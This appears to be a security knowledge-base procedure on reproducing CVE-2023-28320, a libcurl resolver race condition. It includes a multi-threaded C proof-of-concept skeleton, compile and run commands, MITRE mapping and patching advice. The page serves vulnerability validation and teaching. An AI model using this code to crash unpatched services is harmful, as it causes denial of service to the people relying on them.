---
tags:
  - race-condition
  - libcurl
  - denial-of-service
  - cve-2023-28320
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/gcc-compile-test]]'
  - '[[commands/multi-threaded-curl-trigger]]'
platforms:
  - Linux
  - Unix-like
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 4e02af37-f3b5-4be2-93f0-42dc9b745487
created_at: '2025-12-14T17:24:18.817Z'
updated_at: '2025-12-14T17:24:18.817Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Trigger-libcurl-Resolver-Race-Condition

## Summary

This procedure demonstrates the exploitation of CVE-2023-28320 by creating and running a multi-threaded C program that uses libcurl's synchronous resolver backend. Concurrent DNS resolution attempts with timeouts trigger a race on an unprotected global buffer, leading to application crashes or misbehavior, effectively causing denial of service in affected environments.

## Description

The vulnerability stems from libcurl's handling of name resolution timeouts in its synchronous backend, where alarm() and siglongjmp() interact with a global buffer lacking mutex protection. In multi-threaded applications, threads racing to resolve hostnames can corrupt the buffer, resulting in crashes (e.g., segmentation faults) or undefined behavior like failed operations. This procedure targets Linux/Unix-like systems with vulnerable libcurl versions, requiring compilation of a test program to simulate concurrent access. Expected outcomes include reproducible crashes under load, illustrating the DoS potential without needing remote access.

## Requirements

1. Linux or Unix-like OS with GCC and libcurl-devel installed
2. Vulnerable libcurl version (pre-patch for CVE-2023-28320)
3. pthread library for multi-threading support

## Defense

Defensive measures and detection strategies:

- Patch libcurl to the latest version addressing CVE-2023-28320
- Use asynchronous resolver backends (e.g., c-ares) in multi-threaded apps to avoid synchronous mode
- Implement mutex locks around resolver calls or monitor for SIGSEGV in logs during high-concurrency DNS operations

## Objectives

1. Reproduce the race condition to validate vulnerability presence
2. Demonstrate DoS impact through application instability
3. Educate on risks of global shared state in libraries

## Instructions

### Step 1: Create Demonstration Source Code

**Context**: Write a C program that spawns multiple threads, each performing a curl_easy_perform() on a hostname with a short timeout to invoke the synchronous resolver and trigger the race.

Save the following code as `curl_race_demo.c` (example skeleton; adapt for full implementation):

```c
#include <curl/curl.h>
#include <pthread.h>
#include <stdio.h>

void* thread_func(void* arg) {
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "http://nonexistent-host.example.com");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return NULL;
}

int main() {
    pthread_t threads[10];
    for(int i = 0; i < 10; i++) {
        pthread_create(&threads[i], NULL, thread_func, NULL);
    }
    for(int i = 0; i < 10; i++) {
        pthread_join(threads[i], NULL);
    }
    return 0;
}
```

> This code initializes 10 threads, each attempting a timed-out resolution, racing on the global buffer.

### Step 2: Compile the Program

**Context**: Use GCC to compile the source with libcurl and pthread linkages.

**Command** ([[commands/gcc-compile-test]]):
```bash
gcc -o curl_race_test curl_race_demo.c -lcurl -lpthread
```

> Compilation succeeds if dependencies are met; the binary is ready for execution.

### Step 3: Execute and Trigger the Race

**Context**: Run the program to observe concurrent resolver calls leading to buffer corruption and crash.

**Command** ([[commands/multi-threaded-curl-trigger]]):
```bash
./curl_race_test
```

> Expect output like segmentation fault or erratic thread failures; use `ulimit -c unlimited` beforehand for core dumps to analyze the race.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/gcc-compile-test]]
- [[commands/multi-threaded-curl-trigger]]

## Tools Used


## Tags

- race-condition
- libcurl
- denial-of-service
- cve-2023-28320
